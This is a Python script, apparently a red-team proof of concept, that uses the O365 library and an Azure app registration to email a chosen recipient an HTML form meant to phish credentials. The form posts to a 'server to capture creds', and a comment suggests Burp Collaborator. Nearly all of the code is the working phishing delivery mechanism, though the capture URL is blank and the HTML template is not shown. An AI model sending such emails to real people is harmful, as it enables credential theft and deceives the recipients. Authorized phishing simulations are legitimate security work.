import datetime as dt
import re
import uuid
from O365 import Account

# 1) Login at Azure Portal (App Registrations) @ https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade

# 2) Create an app. Set a name.

# 3) In Supported account types choose "Accounts in any organizational directory and personal Microsoft accounts (e.g. Skype, Xbox, Outlook.com)", if you are using a personal account.

# 4) Set the redirect uri (Web) to: https://login.microsoftonline.com/common/oauth2/nativeclient and click register. This needs to be inserted into the "Redirect URI" text box as simply checking the check box next to this link seems to be insufficent. This is the default redirect uri used by this library, but you can use any other if you want.

# 5) Write down the Application (client) ID. You will need this value.

# 6) Under "Certificates & secrets", generate a new client secret. Set the expiration preferably to never. Write down the value of the client secret created now. It will be hidden later on.

# 7) Under Api Permissions:

    #When authenticating "on behalf of a user":
            #1. Add the delegated permissions for Microsoft Graph you want (see scopes).
            
            #2. It is highly recommended to add "offline_access" permission. If not the user you will have to re-authenticate every hour.
            
    #When authenticating "with your own identity":
            #1. Add the application permissions for Microsoft Graph you want.
            
            #2. Click on the Grant Admin Consent button (if you have admin permissions) or wait until the admin has given consent to your application.
            
# 8) To read and send emails use:

        #Microsoft Graph - Mail - Mail.ReadWrite
        #Microsoft Graph - Mail - Mail.Send
        #Microsoft Graph - User - User.Read

# 9) Then you need to login for the first time to get the access token that will grant access to the user resources.

## ENTER YOUR APPLICATION ID AND SECRET KEY BELOW
credentials = ('APPLICATION/CLIENT ID', 'SECRET')

account = Account(credentials)
if account.authenticate(scopes=['basic', 'message_all']):
   print('Authenticated!')

## REPLACE WITH WHO THE EMAIL IS GOING TO
recipient = 'RECIPIENT@HERE.COM'

## REPLACE WITH SERVER TO CAPTURE CREDS (Burp Collaborator is Easy!) (Start with "https://" to avoid browser warnings)
url = 'https://'

m = account.new_message()

## Adds the recipient
m.to.add(recipient)

## REPLACE WITH THE SUBJECT OF THE EMAIL
m.subject = 'Email Body Form Phishing PoC'
    
## Filename/Path of HTML Template for Email Body
with open('EmailFormBodyPoC.html', 'r') as file:
    data = file.read().replace('\n', '')

## REGEX to Find and Replace URL Value in HTML Template, Like the URL above.
newdata2 = re.sub('<URLSTART>.*?<URLEND>',url,data, flags=re.DOTALL)
    
m.body = newdata2 
m.send()
    
# Prints to Terminal
print('Sending an email to ' + recipient)
    
 